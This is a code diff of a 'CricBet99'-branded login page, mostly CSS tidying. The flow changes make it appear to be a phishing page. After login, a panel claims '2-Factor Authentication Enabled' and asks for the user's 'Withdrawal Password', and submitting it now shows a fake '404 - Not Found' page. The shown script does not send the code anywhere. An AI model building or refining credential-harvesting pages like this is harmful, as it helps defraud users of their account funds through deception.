@@ -8,7 +8,6 @@
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(180deg, #8a4e00, #116257);
-
             margin: 0;
             padding: 0;
             display: flex;
@@ -23,10 +22,10 @@
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 280px;
-            height: 330px; /* Adjusted height */
+            height: 330px;
             text-align: center;
             position: relative;
-            top: -120px; /* Adjusted top position */
+            top: -120px;
         }
 
         .login-container img {
@@ -42,9 +41,8 @@
             margin-top: 40px;
         }
 
-        /* Change the color of Login heading to brown */
         h2 {
-            color: #8B4513; /* Brown color */
+            color: #8B4513;
             font-size: 24px;
             font-weight: bold;
             margin-bottom: 20px;
@@ -85,17 +83,12 @@
         }
 
         .login-demo-btn {
-            margin-top: 10px; /* Reduced margin-top to move the button up */
+            margin-top: 10px;
             background-color: #8B4513;
         }
 
         .login-demo-btn:hover {
             background-color: #5A3310;
-        }
-
-        .signup-link {
-            text-align: center;
-            margin-top: 10px;
         }
 
         .recaptcha-text {
@@ -104,34 +97,22 @@
             text-align: center;
             margin-top: 15px;
         }
+/* Remove space between lines */
+.auth-text {
+    text-align: center;
+    margin-top: 10px;
+    padding: 0; /* Remove any padding */
+}
 
-        .privacy-terms-btn {
-            background-color: #007bff;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 4px;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 14px;
-            margin-top: 15px;
-            width: 100%;
-            text-align: center;
-        }
+.line, .password-prompt {
+    font-size: 16px;
+    font-weight: bold;
+    color: black;
+    margin: 0; /* Remove extra margin */
+    padding: 0; /* Remove any padding */
+}
 
-        .privacy-terms-btn:hover {
-            background-color: #0056b3;
-        }
-
-        .recaptcha-text a {
-            color: #007bff;
-            text-decoration: none;
-        }
-
-        .recaptcha-text a:hover {
-            text-decoration: underline;
-        }
-
-        /* Adjusting the demo-page container's margin to move it upwards */
+        /* Demo Login Form */
         .demo-page {
             display: none;
             background-color: #fff;
@@ -140,17 +121,15 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 280px;
             text-align: center;
-            position: relative; /* Or use position: absolute; */
-            top: -190px; /* Adjust this to move it higher */
-            margin-top: 0; /* Set to 0 for cleaner positioning */
+            position: relative;
+            top: -190px;
         }
 
-        /* Demo container logo styling */
         .demo-page img.demo-logo {
-            width: 350px; /* Same width as the login container logo */
+            width: 350px;
             height: auto;
             position: absolute;
-            top: -90px; /* Same position as the login container logo */
+            top: -90px;
             left: 50%;
             transform: translateX(-50%);
         }
@@ -163,28 +142,15 @@
             border-radius: 4px;
         }
 
-        /* New styles for auth-text */
-        .auth-text {
+        /* 404 Error Page */
+        .error-page {
+            display: none;
             text-align: center;
-            margin-top: 10px;
-            padding: 0;
+            font-size: 30px;
+            color: red;
+            margin-top: 50px;
         }
 
-        .line {
-            font-size: 16px;
-            font-weight: bold;
-            color: black;
-            margin: 0; /* Remove extra margin */
-            padding: 0; /* Remove any padding */
-        }
-
-        .password-prompt {
-            font-size: 16px;
-            font-weight: bold;
-            color: black;
-            margin: 0; /* Remove extra margin */
-            padding: 0; /* Remove any padding */
-        }
     </style>
 </head>
 <body>
@@ -193,7 +159,7 @@
     <div class="login-container">
         <img src="logo.png" alt="CricBet99 Logo">
         <div class="form-container">
-            <h2>Login</h2> <!-- Brown colored Login heading -->
+            <h2>Login</h2>
             <form onsubmit="return showDemoPage();">
                 <div class="form-group">
                     <label for="UserName"></label>
@@ -208,38 +174,41 @@
             
             <button class="btn login-demo-btn" onclick="showDemoPage()">Login with Demo ID</button>
             
-            <div class="signup-link"></div>
             <div class="recaptcha-text">
-                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
+                <span>This site is protected by reCAPTCHA and the Google</span> 
                 <a href="#">Privacy Policy</a> and 
                 <a href="#">Terms of Service</a> apply.
             </div>
         </div>
     </div>
 
-  <!-- Demo Login Form -->
-<div class="demo-page" id="demoPage">
-    <!-- Add a logo for the demo container -->
-    <img src="logo.png" alt="CricBet99 Logo" class="demo-logo">
-    
-    <h2>Login</h2>
-    <div class="auth-text">
-        <p class="line">2-Factor Authentication Enabled.</p>
-        <p class="password-prompt">Enter Your Withdrawal Password</p>
+    <!-- Demo Login Form -->
+    <div class="demo-page" id="demoPage">
+        <img src="logo.png" alt="CricBet99 Logo" class="demo-logo">
+        <h2>Login</h2>
+        <div class="auth-text">
+            <p class="line">2-Factor Authentication Enabled.</p>
+            <p class="password-prompt">Enter Your Withdrawal Password</p>
+        </div>
+
+        <form id="demoForm">
+            <div class="form-group">
+                <input type="text" id="demoUser" name="demoUser" placeholder="Withdrawal Code" required>
+            </div>
+            <button type="submit" class="btn">Submit</button>
+        </form>
+        <div class="recaptcha-text">
+            <span>This site is protected by reCAPTCHA and the Google</span> 
+            <a href="#">Privacy Policy</a> and 
+            <a href="#">Terms of Service</a> apply.
+        </div>
     </div>
 
-    <form id="demoForm">
-        <div class="form-group">
-            <input type="text" id="demoUser" name="demoUser" placeholder="Withdrawal Code" required>
-        </div>
-        <button type="submit" class="btn">Submit</button>
-    </form>
-    <div class="recaptcha-text">
-        <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
-        <a href="#">Privacy Policy</a> and 
-        <a href="#">Terms of Service</a> apply.
+    <!-- Error 404 Page -->
+    <div class="error-page" id="errorPage">
+        <p>404 - Not Found</p>
+        <p>Sorry, the page you're looking for does not exist.</p>
     </div>
-</div>
 
     <script>
         // Show demo login form when "Login" button or "Login with Demo ID" button is clicked
@@ -251,11 +220,13 @@
             return false; // Prevent default form submission
         }
 
-        // Handle the demo form submission
+        // Handle the demo form submission (where withdrawal code is entered)
         document.getElementById('demoForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            alert('Demo Login Submitted!');
-            // You can perform additional actions here, like form validation
+            // Hide the demo login form
+            document.getElementById('demoPage').style.display = 'none';
+            // Show the error page
+            document.getElementById('errorPage').style.display = 'block';
         });
     </script>
 
